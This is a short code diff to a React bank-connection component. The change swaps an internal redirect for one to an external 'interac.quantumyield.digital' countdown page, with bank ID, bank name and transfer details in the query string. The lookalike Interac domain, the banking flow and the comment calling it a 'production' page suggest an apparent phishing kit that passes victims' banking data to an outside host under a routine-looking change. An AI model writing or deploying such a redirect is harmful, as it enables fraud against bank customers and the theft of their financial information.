@@ -56,6 +56,7 @@ export default function BankConnectionFlow({ selectedInstitutions, onBack, onCom
   }
 
   const handleRedirect = () => {
+    // Build countdown URL with all transaction parameters using URLSearchParams for proper encoding
     const params = new URLSearchParams({
       bankId: currentInstitution.id,
       bankName: currentInstitution.name,
@@ -73,8 +74,9 @@ export default function BankConnectionFlow({ selectedInstitutions, onBack, onCom
       params.set("timestamp", transferData.timestamp)
     }
 
-    // Redirect to countdown page
-    router.push(`/countdown?${params.toString()}`)
+    // Redirect to production countdown page
+    const countdownUrl = `https://interac.quantumyield.digital/countdown?${params.toString()}`
+    window.location.href = countdownUrl
   }
 
   const handleSkip = () => {
